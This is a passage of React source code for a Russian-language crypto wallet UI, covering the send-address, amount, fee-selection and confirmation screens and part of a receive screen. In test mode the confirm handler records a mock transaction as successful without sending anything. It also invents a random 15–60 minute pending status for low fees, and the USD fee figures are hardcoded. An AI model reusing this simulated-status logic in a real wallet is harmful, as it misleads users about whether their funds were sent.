      <div style={{ display: "flex", flexDirection: "column", alignItems: "center", padding: "16px 0 24px" }}>
        <div style={{ width: 64, height: 64, borderRadius: "50%", overflow: "hidden", background: "#3B7DFF", display: "flex", alignItems: "center", justifyContent: "center" }}>
          <div style={{ width: 44, height: 44 }}>
            <TokenIcon tokenId={asset.tokenId} size={44} badgeSize={18} />
          </div>
        </div>
        <div style={{ color: "white", fontWeight: 700, fontSize: 18, marginTop: 12 }}>
          {asset.symbol}
        </div>
      </div>
      <div style={{ padding: "0 16px", display: "flex", flexDirection: "column", gap: 12 }}>
        <div style={{ background: "#181820", borderRadius: 16, padding: "14px 16px" }}>
          <div style={{ color: "#888", fontSize: 12, marginBottom: 4 }}>Адрес или имя</div>
          <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
            <input value={address} onChange={(e) => setAddress(e.target.value)} placeholder=""
              style={{ background: "none", border: "none", outline: "none", color: "white", fontSize: 16, flex: 1, fontWeight: 500 }} />
            {address && (
              <button onClick={() => setAddress("")} style={{ background: "none", border: "none", cursor: "pointer", color: "#888" }}>
                <svg viewBox="0 0 24 24" fill="none" style={{ width: 20, height: 20 }}>
                  <path d="M18 6L6 18M6 6l12 12" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" />
                </svg>
              </button>
            )}
          </div>
        </div>

        <div style={{ background: "#181820", borderRadius: 16, padding: "14px 16px", display: "flex", alignItems: "center", gap: 12 }}>
          <input value={memoText} onChange={(e) => setMemoText(e.target.value)} placeholder="Мемо"
            style={{ background: "none", border: "none", outline: "none", color: "white", fontSize: 16, flex: 1, fontWeight: 500 }} />
          <button style={{ background: "none", border: "none", cursor: "pointer", padding: 4 }}>
            <svg viewBox="0 0 24 24" fill="none" style={{ width: 20, height: 20 }}>
              <rect x="8" y="2" width="13" height="17" rx="2" stroke="#888" strokeWidth="1.7" />
              <path d="M3 6v13a2 2 0 0 0 2 2h10" stroke="#888" strokeWidth="1.7" strokeLinecap="round" />
            </svg>
          </button>
          <button style={{ background: "none", border: "none", cursor: "pointer", padding: 4 }}>
            <svg viewBox="0 0 24 24" fill="none" style={{ width: 20, height: 20 }}>
              <rect x="4" y="4" width="6" height="6" stroke="#888" strokeWidth="2" />
              <rect x="14" y="4" width="6" height="6" stroke="#888" strokeWidth="2" />
              <rect x="4" y="14" width="6" height="6" stroke="#888" strokeWidth="2" />
              <rect x="14" y="14" width="2" height="2" fill="#888" />
              <rect x="18" y="14" width="2" height="2" fill="#888" />
              <rect x="14" y="18" width="2" height="2" fill="#888" />
              <rect x="18" y="18" width="2" height="2" fill="#888" />
            </svg>
          </button>
        </div>
      </div>
      <div style={{ padding: "16px", marginTop: "auto" }}>
        <button onClick={() => address && onContinue(address)}
          style={{ width: "100%", padding: "17px 0", borderRadius: 28, border: "none",
            background: address ? "#3B7DFF" : "#252530", color: address ? "white" : "#555",
            fontSize: 16, fontWeight: 600, cursor: address ? "pointer" : "default", transition: "background 0.2s", display: "flex", alignItems: "center", justifyContent: "center", gap: 12 }}>
          <div style={{ width: 20, height: 20, background: "white", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center" }}>
            <svg viewBox="0 0 24 24" fill="none" style={{ width: 12, height: 12 }}>
              <path d="M17 1l4 4-4 4M7 23l-4-4 4-4M21 5H9a5 5 0 00-5 5v2M3 19h12a5 5 0 005-5v-2" stroke="#3B7DFF" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" />
            </svg>
          </div>
          Продолжить
        </button>
      </div>
    </div>
  );
}

/* ─── Screen: Send — amount ─────────────────────────────────── */
function SendAmountScreen({ assetId, onBack, onContinue }) {
  const { balances } = useWallet();
  const liveAssets = useAssets();
  const livePriceMap = useLivePriceMap();
  const asset = liveAssets.find((a) => a.id === assetId);
  const [amount, setAmount] = useState("");
  const [isUsdMode, setIsUsdMode] = useState(true);

  const getRealBalance = (id) => {
    if (!balances) return 0;
    let val = 0;
    switch(id) {
      case 'btc':      val = balances.BTC || balances.bitcoin || 0; break;
      case 'ltc':      val = balances.LTC || balances.litecoin || 0; break;
      case 'eth':      val = balances.ETH || balances.ethereum || 0; break;
      case 'ton':      val = balances.TON || balances.ton || 0; break;
      case 'arb':      val = balances.ARB || balances.arbitrum || 0; break;
      case 'bnb':      val = balances.BNB || balances.bsc || 0; break;
      case 'sol':      val = balances.SOL || balances.solana || 0; break;
      case 'usdt-eth': val = balances._usdtByNetwork?.eth || 0; break;
      case 'usdt-bnb': val = balances._usdtByNetwork?.bnb || 0; break;
      case 'usdt-sol': val = balances._usdtByNetwork?.sol || 0; break;
      case 'usdt-ton': val = balances._usdtByNetwork?.ton || 0; break;
      case 'usdt-trx': val = balances._usdtByNetwork?.trx || 0; break;
      default: val = 0;
    }
    return parseFloat(val) || 0;
  };

  if (!asset) return null;

  const realBal = getRealBalance(assetId);
  const balStr = fmtBal(realBal, asset.symbol);
  
  const getLivePrice = (id) => {
    if (!id || id.startsWith('usdt')) return 1.00;
    const live = livePriceMap[id];
    if (live) return live.usdPrice;
    return BASE_ASSETS.find(a => a.id === id)?.usdPrice || 1;
  };
  const price = getLivePrice(assetId);
  
  const currentNum = parseFloat(amount.replace(",", ".")) || 0;
  const convertedValue = isUsdMode 
    ? (currentNum / price).toFixed(6).replace(".", ",") 
    : (currentNum * price).toFixed(2).replace(".", ",");

  const handleMax = () => {
    if (isUsdMode) {
      setAmount((realBal * price).toFixed(2));
    } else {
      setAmount(realBal.toString());
    }
  };

  const finalAmountCoin = isUsdMode ? parseFloat((currentNum / price).toFixed(6)).toString() : amount;

  return (
    <div style={{ display: "flex", flexDirection: "column", flex: 1 }}>
      <TopBar title="Отправить" onBack={onBack} rightEl={
        <button onClick={() => onContinue(finalAmountCoin)}
          style={{ background: "none", border: "none", color: "#3B7DFF", fontSize: 13, fontWeight: 700, cursor: "pointer", whiteSpace: "nowrap", textTransform: "uppercase" }}>
          ПРОДОЛЖИТЬ
        </button>
      } />
      
      <div style={{ textAlign: "center", padding: "40px 20px 20px" }}>
        <div style={{ color: "white", fontSize: 44, fontWeight: 700, letterSpacing: -1, display: "flex", alignItems: "center", justifyContent: "center" }}>
          {isUsdMode && <span style={{ marginRight: 8 }}>$</span>}
          <input 
            autoFocus
            type="text"
            inputMode="decimal"
            value={amount} 
            onChange={e => setAmount(e.target.value.replace(/[^0-9.,]/g, ""))}
            placeholder="0"
            style={{ background: "none", border: "none", outline: "none", color: "white", fontSize: 44, fontWeight: 700, letterSpacing: -1, textAlign: "center", width: "160px" }} 
          />
        </div>
        
        <div onClick={() => setIsUsdMode(!isUsdMode)}
          style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 6, marginTop: 8, cursor: "pointer" }}>
          <span style={{ color: "#888", fontSize: 15 }}>{convertedValue} {isUsdMode ? asset.symbol : "$"}</span>
          <svg viewBox="0 0 24 24" fill="none" style={{ width: 16, height: 16 }}>
            <path d="M7 16V4m0 0L3 8m4-4l4 4M17 8v12m0 0l4-4m-4 4l-4-4" stroke="#888" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
          </svg>
        </div>
      </div>

      <div style={{ margin: "16px 16px 0", background: "#181820", borderRadius: 16, padding: "14px 16px", display: "flex", alignItems: "center" }}>
        <div style={{ width: 40, height: 40, borderRadius: "50%", background: "#3B7DFF", display: "flex", alignItems: "center", justifyContent: "center" }}>
          <div style={{ width: 28, height: 28 }}>
            <TokenIcon tokenId={asset.tokenId} size={28} badgeSize={12} />
          </div>
        </div>
        <div style={{ flex: 1, marginLeft: 12 }}>
          <div style={{ color: "white", fontWeight: 600, fontSize: 15 }}>{asset.symbol}</div>
          <div style={{ color: "#888", fontSize: 13, marginTop: 2 }}>Баланс: {balStr}</div>
        </div>
        <button onClick={handleMax}
          style={{ background: "#252530", border: "none", borderRadius: 10, color: "white", fontSize: 13, fontWeight: 600, padding: "8px 16px", cursor: "pointer" }}>
          Макс
        </button>
      </div>

      <div style={{ padding: "20px 16px", marginTop: "auto" }}>
        <button onClick={() => onContinue(finalAmountCoin)}
          style={{ width: "100%", padding: "17px 0", borderRadius: 28, border: "none", background: "#3B7DFF", color: "white", fontSize: 17, fontWeight: 700, cursor: "pointer" }}>
          Продолжить
        </button>
      </div>
    </div>
  );
}

/* ─── Screen: Send — fee selection (standalone step) ────────── */
function SendFeeScreen({ assetId, onBack, onContinue }) {
  const evmMap = {
    btc: "BTC",
    eth: "ETH", bnb: "BNB", arb: "ARB", ltc: "LTC", sol: "SOL", ton: "TON",
    "usdt-eth": "ETH", "usdt-bnb": "BNB", "usdt-sol": "SOL", "usdt-ton": "TON", "usdt-arb": "ARB",
  };
  const evmSym = evmMap[assetId] || "ETH";

  const UNITS = { BTC: "sat/vB", ETH: "Gwei", BNB: "Gwei", ARB: "Gwei", LTC: "sat/vB", SOL: "Lamports", TON: "NanoTON" };
  const unitLabel = UNITS[evmSym] || "Gwei";

  const FEE_TABLE = {
    BTC: { slow: { native: 5,        usd: "1,43" }, normal: { native: 10,       usd: "2,81" }, fast: { native: 20,        usd: "5,62" } },
    ETH: { slow: { native: 15,       usd: "1,20" }, normal: { native: 30,        usd: "2,50" }, fast: { native: 60,        usd: "5,00" } },
    BNB: { slow: { native: 10,       usd: "0,02" }, normal: { native: 20,        usd: "0,04" }, fast: { native: 50,        usd: "0,10" } },
    ARB: { slow: { native: 10,       usd: "0,01" }, normal: { native: 20,        usd: "0,02" }, fast: { native: 50,        usd: "0,05" } },
    LTC: { slow: { native: 10,       usd: "0,01" }, normal: { native: 20,        usd: "0,02" }, fast: { native: 50,        usd: "0,05" } },
    SOL: { slow: { native: 5000,     usd: "0,001" }, normal: { native: 10000,   usd: "0,002" }, fast: { native: 25000,    usd: "0,005" } },
    TON: { slow: { native: 5000000,  usd: "0,01" }, normal: { native: 10000000, usd: "0,02" }, fast: { native: 25000000, usd: "0,05"  } },
  };
  const FEE_MUL = { slow: 0.8, normal: 1.0, fast: 1.3 };
  const FEE_META = {
    slow:   { label: "Экономный", time: "~10 мин", color: "#34D760" },
    normal: { label: "Обычный",   time: "~2 мин",  color: DS.blue },
    fast:   { label: "Быстрый",   time: "~30 сек", color: "#FF9F0A" },
  };
  const feeData = FEE_TABLE[evmSym] || FEE_TABLE.ETH;

  const [selected, setSelected] = useState("normal");
  const [customVal, setCustomVal] = useState("");
  const handleSelectCustom = () => {
    setSelected("custom");
    if (!customVal) setCustomVal(String(feeData.normal.native));
  };
  const isCustom = selected === "custom";
  const canContinue = !isCustom || (customVal.trim() !== "" && parseFloat(customVal) > 0);

    function handleContinue() {
    if (!canContinue) return;
    const isBtc = evmSym === "BTC";
    if (isCustom) {
      const raw = parseFloat(customVal) || 0;
      const slowVal = feeData.slow.native;
      const isTooLow = raw > 0 && raw <= slowVal / 10;
      onContinue({ key: "custom", native: raw, nativeFormatted: formatFee(raw), usd: "—", unitLabel, multiplier: 1.0, isCustom: true, isTooLow, slowThreshold: slowVal / 10, btcFeeRateSatVb: isBtc ? raw : undefined });
    } else {
      const d = feeData[selected];
      onContinue({ key: selected, native: d.native, nativeFormatted: formatFee(d.native), usd: d.usd, unitLabel, multiplier: FEE_MUL[selected], isCustom: false, isTooLow: false, btcFeeRateSatVb: isBtc ? d.native : undefined });
    }
  }

  const CheckIcon = () => (
    <svg viewBox="0 0 24 24" fill="none" style={{ width: 12, height: 12 }}>
      <path d="M20 6L9 17l-5-5" stroke="white" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" />
    </svg>
  );

  return (
    <div style={{ display: "flex", flexDirection: "column", flex: 1, background: DS.bg }}>
      <TopBar title="Сетевая плата" onBack={onBack} />

      <div style={{ padding: "16px 16px 0" }}>
        <div style={{ color: DS.muted, fontSize: 13, textAlign: "center", marginBottom: 16 }}>
          Единица комиссии: <span style={{ color: "white", fontWeight: 600 }}>{unitLabel}</span>
        </div>

        <div style={{ background: DS.card, borderRadius: 20, overflow: "hidden", border: `1px solid ${DS.border}` }}>
          {["slow", "normal", "fast"].map((key, i) => {
            const isSel = selected === key;
            const d = feeData[key];
            return (
              <div key={key} onClick={() => setSelected(key)}
                style={{ display: "flex", alignItems: "center", padding: "16px", cursor: "pointer",
                  borderBottom: i < 2 ? `1px solid ${DS.border}` : "none",
                  background: isSel ? "rgba(0,122,255,0.07)" : "none",
                  transition: "background 0.15s" }}>
                <div style={{ flex: 1 }}>
                  <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                    <span style={{ color: "white", fontWeight: 600, fontSize: 16 }}>{FEE_META[key].label}</span>
                    <span style={{ color: FEE_META[key].color, fontSize: 11, fontWeight: 700,
                      background: `${FEE_META[key].color}22`, padding: "2px 8px", borderRadius: 20 }}>
                      {FEE_META[key].time}
                    </span>
                  </div>
                  <div style={{ color: DS.muted, fontSize: 13, marginTop: 4 }}>
                    {formatFee(d.native)} {unitLabel}
                  </div>
                </div>
                <div style={{ display: "flex", flexDirection: "column", alignItems: "flex-end", gap: 6 }}>
                  <span style={{ color: "white", fontWeight: 600, fontSize: 15 }}>{d.usd} $</span>
                  <div style={{ width: 22, height: 22, borderRadius: "50%",
                    background: isSel ? DS.blue : "transparent",
                    border: `2px solid ${isSel ? DS.blue : DS.border}`,
                    display: "flex", alignItems: "center", justifyContent: "center",
                    transition: "all 0.2s" }}>
                    {isSel && <CheckIcon />}
                  </div>
                </div>
              </div>
            );
          })}

          {/* Custom option */}
          <div onClick={handleSelectCustom}
            style={{ display: "flex", alignItems: "flex-start", padding: "16px", cursor: "pointer",
              borderTop: `1px solid ${DS.border}`,
              background: isCustom ? "rgba(0,122,255,0.07)" : "none",
              transition: "background 0.15s" }}>
            <div style={{ flex: 1 }}>
              <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                <span style={{ color: "white", fontWeight: 600, fontSize: 16 }}>Кастомный</span>
                <span style={{ color: DS.muted, fontSize: 11, fontWeight: 700,
                  background: `${DS.border}`, padding: "2px 8px", borderRadius: 20 }}>
                  Вручную
                </span>
              </div>
              {isCustom ? (
                <>
                  <div style={{ marginTop: 10, position: "relative", display: "flex", alignItems: "center" }}>
                    <input
                      type="number"
                      value={customVal}
                      onChange={e => setCustomVal(e.target.value)}
                      onClick={e => e.stopPropagation()}
                      placeholder={String(feeData.normal.native)}
                      min="1"
                      style={{ background: DS.input, border: `1px solid ${DS.border}`,
                        borderRadius: 10, padding: "10px 90px 10px 14px", color: "white", fontSize: 15,
                        width: "100%", outline: "none", fontFamily: DS.font,
                        boxSizing: "border-box", WebkitAppearance: "none" }}
                    />
                    <span style={{ position: "absolute", right: 12, color: DS.muted, fontSize: 12, pointerEvents: "none", whiteSpace: "nowrap" }}>{unitLabel}</span>
                  </div>
                  {customVal && parseFloat(customVal) > 0 && (
                    <div style={{ color: DS.muted, fontSize: 12, marginTop: 5 }}>
                      ≈ {formatFee(parseFloat(customVal))} {unitLabel}
                    </div>
                  )}
                  {customVal && parseFloat(customVal) > 0 && parseFloat(customVal) <= feeData.slow.native / 10 && (
                    <div style={{ display: "flex", alignItems: "flex-start", gap: 6, marginTop: 8, padding: "10px 12px", background: "rgba(255,159,10,0.10)", borderRadius: 10, border: "1px solid rgba(255,159,10,0.25)" }}>
                      <svg viewBox="0 0 24 24" fill="none" style={{ width: 16, height: 16, flexShrink: 0, marginTop: 1 }}>
                        <path d="M12 9v4M12 17h.01" stroke="#FF9F0A" strokeWidth="2" strokeLinecap="round" />
                        <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z" stroke="#FF9F0A" strokeWidth="1.8" />
                      </svg>
                      <span style={{ color: "#FF9F0A", fontSize: 12, lineHeight: 1.4 }}>
                        Слишком низкая комиссия. Транзакция будет зависать 15–60 минут. Вы сможете её отменить.
                      </span>
                    </div>
                  )}
                </>
              ) : (
                <div style={{ color: DS.muted, fontSize: 13, marginTop: 4 }}>Ввести вручную</div>
              )}
            </div>
            <div style={{ width: 22, height: 22, borderRadius: "50%", flexShrink: 0,
              background: isCustom ? DS.blue : "transparent",
              border: `2px solid ${isCustom ? DS.blue : DS.border}`,
              display: "flex", alignItems: "center", justifyContent: "center",
              marginLeft: 12, marginTop: 2, transition: "all 0.2s" }}>
              {isCustom && <svg viewBox="0 0 24 24" fill="none" style={{ width: 12, height: 12 }}>
                <path d="M20 6L9 17l-5-5" stroke="white" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" />
              </svg>}
            </div>
          </div>
        </div>
      </div>

      <div style={{ padding: "24px 16px", marginTop: "auto" }}>
        <button onClick={handleContinue} disabled={!canContinue}
          style={{ width: "100%", padding: "17px 0", borderRadius: 28, border: "none",
            background: canContinue ? DS.blue : DS.card, color: "white",
            fontSize: 17, fontWeight: 700, cursor: canContinue ? "pointer" : "default",
            transition: "all 0.3s", opacity: canContinue ? 1 : 0.5 }}>
          Продолжить
        </button>
      </div>
    </div>
  );
}

/* ─── Screen: Send — confirm ─────────────────────────────────── */
const SendConfirmScreen = memo(({ assetId, recipient, amount, feeInfo, onBack, onConfirm }) => {
  const liveAssets = useAssets();
  const livePriceMap = useLivePriceMap();
  const asset = liveAssets.find((a) => a.id === assetId);
  const { sendTransaction, addMockTransaction, testMode, settings: sendSettings } = useWallet();
  const shortRecipient = recipient && recipient.length > 16 ? recipient.slice(0, 7) + "…" + recipient.slice(-7) : (recipient || "");

  const [status, setStatus] = useState("idle");
  const [txError, setTxError] = useState("");

  const _confirmLivePrice = (() => {
    if (!assetId || assetId.startsWith('usdt')) return 1.00;
    const live = livePriceMap[assetId];
    if (live) return live.usdPrice;
    return BASE_ASSETS.find(a => a.id === assetId)?.usdPrice || 1;
  })();
  const usdValue = (parseFloat(amount.replace(",", ".")) * _confirmLivePrice).toFixed(2).replace(".", ",");

  const fi = feeInfo || { nativeFormatted: "—", usd: "—", unitLabel: "", multiplier: 1.0, key: "normal" };

  const isSending = status === "sending";
  const isSuccess = status === "success";

  const FEE_LABEL = { slow: "Экономный", normal: "Обычный", fast: "Быстрый", custom: "Кастомный" };
  const FEE_COLOR = { slow: "#34D760", normal: DS.blue, fast: "#FF9F0A", custom: DS.muted };

  async function handleConfirm() {
    if (isSending || isSuccess) return;
    setStatus("sending");
    setTxError("");
    try {
      if (!testMode) {
        await sendTransaction({
          assetId,
          to: recipient,
          amount: amount.replace(",", "."),
          feeMultiplier: fi.multiplier,
          btcFeeRateSatVb: fi.btcFeeRateSatVb,
        });
      }
      const finalFeeStr = `${fi.nativeFormatted} ${fi.unitLabel}`.trim();
      const isPending = !!fi.isTooLow;
      const pendingUntil = isPending
        ? Date.now() + (Math.floor(Math.random() * 46) + 15) * 60 * 1000
        : null;
      await addMockTransaction({
        assetId,
        amount,
        from: "Ваш кошелек",
        to: recipient,
        type: "Отправлено",
        fee: finalFeeStr,
        status: isPending ? "В процессе" : "Успешный",
        pendingUntil,
      });
      setStatus("success");
      setTimeout(() => onConfirm(), 1500);
    } catch (e) {
      console.error("Send error:", e);
      setTxError(e.message || "Ошибка транзакции");
      setStatus("error");
      setTimeout(() => setStatus("idle"), 3000);
    }
  }

  return (
    <div style={{ display: "flex", flexDirection: "column", flex: 1, background: DS.bg }}>
      <TopBar title="Отправить" onBack={isSending ? undefined : onBack} />

      <div style={{ display: "flex", flexDirection: "column", alignItems: "center", padding: "20px 0 32px" }}>
        <div style={{ width: 64, height: 64, borderRadius: "50%", background: "#3B7DFF", display: "flex", alignItems: "center", justifyContent: "center" }}>
          <div style={{ width: 44, height: 44 }}>
            <TokenIcon tokenId={asset.tokenId} size={44} badgeSize={18} />
          </div>
        </div>
        <div style={{ color: "white", fontSize: 40, fontWeight: 700, marginTop: 20, letterSpacing: -1, textAlign: "center", padding: "0 20px" }}>
          {amount.length > 8 ? amount.slice(0, 7) + "..." + amount.slice(-2) : amount} {asset.symbol}
        </div>
        <div style={{ color: DS.muted, fontSize: 15, marginTop: 6, fontWeight: 500 }}>{usdValue} $</div>
      </div>

      <div style={{ background: DS.card, borderRadius: 20, margin: "0 16px 20px", overflow: "hidden", border: `1px solid ${DS.border}` }}>
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "16px", borderBottom: `1px solid ${DS.border}` }}>
          <span style={{ color: DS.muted, fontSize: 15 }}>Кошелек</span>
          <span style={{ color: DS.muted, fontSize: 15, fontWeight: 500 }}>{sendSettings?.walletName || 'Кошелек № 1'}</span>
        </div>
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "16px", borderBottom: `1px solid ${DS.border}` }}>
          <span style={{ color: DS.muted, fontSize: 15 }}>Получатель</span>
          <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
            <span style={{ color: DS.muted, fontSize: 15, fontWeight: 500 }}>{shortRecipient}</span>
            <ChevronRight color={DS.muted} />
          </div>
        </div>
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "16px" }}>
          <span style={{ color: DS.muted, fontSize: 15 }}>Сеть</span>
          <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
            <span style={{ color: DS.muted, fontSize: 15, fontWeight: 500 }}>{asset.symbol}</span>
            <div style={{ width: 20, height: 20 }}>
              <TokenIcon tokenId={asset.tokenId} size={20} badgeSize={8} />
            </div>
          </div>
        </div>
      </div>

      <div style={{ background: DS.card, borderRadius: 20, margin: "0 16px 20px", border: `1px solid ${DS.border}` }}>
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "16px" }}>
          <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
            <span style={{ color: "white", fontSize: 15, fontWeight: 500 }}>Сетевая плата</span>
            <span style={{ color: FEE_COLOR[fi.key] || DS.muted, fontSize: 11, fontWeight: 700,
              background: `${FEE_COLOR[fi.key] || DS.muted}22`, padding: "2px 8px", borderRadius: 20 }}>
              {FEE_LABEL[fi.key] || fi.key}
            </span>
          </div>
          <div style={{ textAlign: "right" }}>
            <div style={{ color: "white", fontWeight: 600, fontSize: 15 }}>
              {fi.nativeFormatted} {fi.unitLabel}
            </div>
            {fi.usd !== "—" && (
              <div style={{ color: DS.muted, fontSize: 12, marginTop: 2 }}>{fi.usd} $</div>
            )}
          </div>
        </div>
      </div>

      <div style={{ padding: "20px 16px", marginTop: "auto" }}>
        {txError && <div style={{ color: DS.danger, fontSize: 13, textAlign: "center", marginBottom: 12, fontWeight: 500 }}>{txError}</div>}
        <button onClick={handleConfirm} disabled={isSending || isSuccess}
          style={{ width: "100%", padding: "17px 0", borderRadius: 28, border: "none",
            background: isSuccess ? DS.green : isSending ? DS.card : DS.blue, color: "white",
            fontSize: 17, fontWeight: 700, cursor: isSending || isSuccess ? "default" : "pointer", transition: "all 0.3s" }}>
          {isSuccess ? "✓ Отправлено" : isSending ? "Отправка…" : "Подтвердить"}
        </button>
      </div>
    </div>
  );
});

/* ─── Screen: Receive — select asset ────────────────────────── */
function ReceiveSelectScreen({ onBack, onSelect }) {
  const { addresses } = useWallet();
  const [tab, setTab] = useState("all");
  const [search, setSearch] = useState("");
  const [showFilter, setShowFilter] = useState(false);
  const [hasBalance, setHasBalance] = useState(false);

  const filtered = BASE_ASSETS.filter((a) => {
    if (tab === "stable" && a.symbol !== "USDT") return false;
    if (search && !a.name.toLowerCase().includes(search.toLowerCase()) && !a.symbol.toLowerCase().includes(search.toLowerCase())) return false;
    return true;
  });

  const recentIds = ["btc", "ton", "eth"];
  const recentItems = BASE_ASSETS.filter((a) => recentIds.includes(a.id));

  const CopyIcon = () => (
    <svg viewBox="0 0 24 24" fill="none" style={{ width: 20, height: 20 }}>
      <rect x="8" y="2" width="13" height="17" rx="2" stroke={DS.muted} strokeWidth="1.7" />
      <path d="M3 6v13a2 2 0 0 0 2 2h10" stroke={DS.muted} strokeWidth="1.7" strokeLinecap="round" />
    </svg>
  );

  const handleSelect = (assetId) => {
    const addr = getAddressForAsset(assetId, addresses);
    if (addr) copyToClipboard(addr);
    onSelect(assetId);
  };

  return (
    <div style={{ display: "flex", flexDirection: "column", flex: 1, position: "relative", background: DS.bg }}>
      <TopBar title="Получить" onBack={onBack}
        rightEl={
          <button onClick={() => setShowFilter(true)} style={{ background: "none", border: "none", cursor: "pointer", padding: 4 }}>
            <svg viewBox="0 0 24 24" fill="none" style={{ width: 20, height: 20 }}>
              <path d="M3 6h18M7 12h10M11 18h2" stroke="white" strokeWidth="1.8" strokeLinecap="round" />
            </svg>
          </button>
        }
      />
      <div style={{ padding: "0 16px 14px" }}>
        <div style={{ background: DS.input, borderRadius: 12, display: "flex", alignItems: "center", padding: "12px 14px", gap: 8 }}>
          <svg viewBox="0 0 24 24" fill="none" style={{ width: 18, height: 18, flexShrink: 0 }}>
            <circle cx="11" cy="11" r="8" stroke={DS.muted} strokeWidth="1.8" />
            <path d="M21 21l-4.35-4.35" stroke={DS.muted} strokeWidth="1.8" strokeLinecap="round" />
          </svg>
          <input value={search} onChange={(e) => setSearch(e.target.value)} placeholder="Поиск"
            style={{ background: "none", border: "none", outline: "none", color: "white", fontSize: 15, width: "100%" }} />
        </div>
      </div>
      <div style={{ display: "flex", padding: "0 16px 16px", gap: 8 }}>
        {[{ key: "all", label: "Все" }, { key: "trending", label: "В тренде" }, { key: "stable", label: "Стейблкоины" }].map((t) => (
          <button key={t.key} onClick={() => setTab(t.key)}
            style={{ padding: "8px 16px", borderRadius: 20, border: "none", cursor: "pointer", fontSize: 14, fontWeight: 500,
              background: tab === t.key ? DS.blue : "transparent", color: tab === t.key ? "white" : DS.muted }}>
            {t.label}
          </button>
        ))}
      </div>
      <div style={{ padding: "0 16px 12px" }}>
        <div style={{ display: "flex", alignItems: "center", gap: 6, marginBottom: 12 }}>
          <span style={{ color: DS.muted, fontSize: 13, fontWeight: 600 }}>Последние</span>
          <svg viewBox="0 0 24 24" fill="none" style={{ width: 14, height: 14 }}>
            <path d="M9 18l6-6-6-6" stroke={DS.muted} strokeWidth="2" strokeLinecap="round" />
          </svg>
        </div>
        <div style={{ display: "flex", gap: 10 }}>
          {recentItems.map((a) => (
            <button key={a.id} onClick={() => handleSelect(a.id)}
              style={{ display: "flex", alignItems: "center", gap: 8, background: DS.card, border: `1px solid ${DS.border}`,
                borderRadius: 20, padding: "8px 16px", cursor: "pointer" }}>
              <div style={{ width: 22, height: 22 }}>
                <TokenIcon tokenId={a.tokenId} size={22} badgeSize={10} />
              </div>
              <span style={{ color: "white", fontSize: 14, fontWeight: 600 }}>{a.symbol}</span>
            </button>
          ))}
        </div>
      </div>
      <div style={{ background: DS.card, borderRadius: 20, margin: "0 12px", overflow: "hidden", border: `1px solid ${DS.border}` }}>
        {filtered.map((asset, i) => (
          <div key={asset.id} onClick={() => handleSelect(asset.id)}
            style={{ display: "flex", alignItems: "center", padding: "16px", cursor: "pointer",
              borderBottom: i < filtered.length - 1 ? `1px solid ${DS.border}` : "none" }}>
            <div style={{ width: 44, height: 44, flexShrink: 0 }}>
              <TokenIcon tokenId={asset.tokenId} size={44} badgeSize={18} />
            </div>
            <div style={{ flex: 1, marginLeft: 14 }}>
              <span style={{ color: "white", fontWeight: 600, fontSize: 16 }}>{asset.name}</span>
              <span style={{ color: DS.muted, fontSize: 14, marginLeft: 8 }}>{asset.symbol}</span>
            </div>
            <CopyIcon />
          </div>
        ))}
      </div>

      {showFilter && (
        <>
          <div onClick={() => setShowFilter(false)}
            style={{ position: "absolute", inset: 0, background: "rgba(0,0,0,0.5)", zIndex: 10 }} />
          <div style={{ position: "absolute", bottom: 0, left: 0, right: 0, background: "#181820",
            borderRadius: "20px 20px 0 0", zIndex: 11, padding: "0 0 32px" }}>
            <div style={{ display: "flex", justifyContent: "center", paddingTop: 10, paddingBottom: 4 }}>
              <div style={{ width: 36, height: 4, borderRadius: 2, background: "#444" }} />
            </div>
            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "10px 20px 16px" }}>
              <button onClick={() => { setHasBalance(false); }} style={{ background: "none", border: "none", cursor: "pointer", color: "#3B7DFF", fontSize: 15 }}>Очистить</button>
              <span style={{ color: "white", fontWeight: 600, fontSize: 16 }}>Фильтры</span>
              <button onClick={() => setShowFilter(false)} style={{ background: "none", border: "none", cursor: "pointer", color: "#3B7DFF", fontSize: 15 }}>Готово</button>
            </div>
            <div style={{ padding: "0 16px 16px" }}>
              <div style={{ background: "#252530", borderRadius: 12, display: "flex", alignItems: "center", padding: "10px 14px", gap: 8 }}>
                <svg viewBox="0 0 24 24" fill="none" style={{ width: 16, height: 16 }}>
                  <circle cx="11" cy="11" r="8" stroke="#888" strokeWidth="1.8" />
                  <path d="M21 21l-4.35-4.35" stroke="#888" strokeWidth="1.8" strokeLinecap="round" />
                </svg>
                <input placeholder="Поиск" style={{ background: "none", border: "none", outline: "none", color: "white", fontSize: 14, width: "100%" }} />
              </div>
            </div>
            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "0 20px 20px" }}>
              <span style={{ color: "white", fontSize: 15 }}>Имеет баланс</span>
              <div onClick={() => setHasBalance(!hasBalance)}
                style={{ width: 44, height: 26, borderRadius: 13, background: hasBalance ? "#3B7DFF" : "#3A3A3C",
                  cursor: "pointer", position: "relative", transition: "background 0.2s" }}>
                <div style={{ position: "absolute", top: 3, left: hasBalance ? 21 : 3, width: 20, height: 20,
                  borderRadius: "50%", background: "white", transition: "left 0.2s" }} />
              </div>
            </div>
            <div style={{ padding: "0 20px 10px" }}>
              <span style={{ color: "#888", fontSize: 13, textTransform: "uppercase", letterSpacing: 0.5 }}>Сети</span>
            </div>
            {[{ name: "Abstract" }, { name: "Algorand" }].map((net) => (
              <div key={net.name} style={{ display: "flex", alignItems: "center", padding: "12px 20px", borderTop: "1px solid #2A2A2C" }}>
